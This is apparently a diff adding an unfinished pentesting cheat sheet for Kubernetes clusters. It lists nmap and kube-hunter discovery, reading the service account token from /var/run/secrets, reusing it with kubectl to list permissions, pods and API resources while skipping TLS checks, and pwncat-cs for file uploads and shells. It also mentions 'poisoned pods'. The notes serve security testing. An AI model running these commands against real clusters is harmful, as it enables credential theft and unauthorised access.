@@ -1,0 +1,116 @@
+# Kubernetes Exploit Hub
+
+## Description
+These are a collection of methods and tools I've found useful on pentesting Kubernetes Clusters. 
+
+### Discovery and Enumeration
+**Discovery with nmap (Sample with IP Address):**
+
+```
+nmap -A -T4 -p- -oA Kubernetes1 10.10.197.28
+```
+
+Pay attention to DNS names from NMAP scan outputs as they can give away that you are working with a Kubernetes environment when you have a cluster operating on a non standard port. 
+
+**Discovering Kubernetes Clusters with Kube Hunter:**
+
+Software URL:https://github.com/aquasecurity/kube-hunter
+
+Installation:
+```
+sudo pip3 install kube-hunter
+```
+
+Example Output:
+
+[Insert Screenshot Here]
+
+### Initial Exploitation
+
+After Gaining access to a cluster. Usually by misconfiguration with the application that it is hosting. PHP, Grafana, etc.
+
+**Service Account Token Location**
+```
+/var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+Dropping out token and exporting it with your current terminal session:
+```
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+```
+export TOKEN={TOKEN]
+```
+
+Example Output:
+
+[Insert Screenshot Here]
+
+**Checking your permissions with the current token that you have(remote command):**
+```
+kubectl --server https://serverip:port --token=$TOKEN auth can-i --list
+```
+
+If cluster is running a self sign certificate then add insecure tls to your command:
+```
+kubectl --server https://serverip:port --token=$TOKEN --insecure-skip-tls-verify auth can-i --list
+```
+**Checking your permissions with the current token that you have (Local Commands):**
+
+This is basically the same thing as above with the exception that you are dropping the --server command
+
+ProTip: If you need to do file transfers to a pod. Its very possible you may be in a pod without wget or curl commands. Normally I am only transferring kubectl and a poisoned pod of some sort. Pwncat-cs has been an excellent choice not only from an upload standpoint but you will have a nice full tty session to work with as well. 
+
+Github: https://github.com/calebstewart/pwncat
+
+Installation:
+
+```
+pip install pwncat-cs
+```
+
+Install with venv (What I would recommend so you don't impact other projects with python version dependicies on your attack box.) 
+
+```
+python3 -m venv pwncat-env
+source pwncat-env/bin/activate
+pip install pwncat-cs
+```
+
+Check Permissions:
+```
+kubectl --token=$TOKEN auth can-i --list
+```
+
+**Checking out what PODS are running**
+(Remote):
+```
+kubectl get pods --server https://serverip:port --token=$TOKEN --insecure-skip-tls-verify
+```
+
+(Local):
+```
+kubectl get pods --token=$TOKEN
+```
+**Get POD Configurations**
+
+This is useful if you need to produce an image of the same type with a posioned pod for later. 
+
+(Local):
+```
+./kubectl get pod php-deploy-6d998f68b9-wlslz --token=$TOKEN -o yaml
+```
+**Hunting for API's and getting secrets from them**
+
+Get API's
+
+(Remote):
+```
+kubectl api-resources --server https://ip:port --token=$TOKEN --insecure-skip-tls-verify
+```
+
+(Local):
+```
+kubectl api-resources --token=$TOKEN --insecure-skip-tls-verify
+```
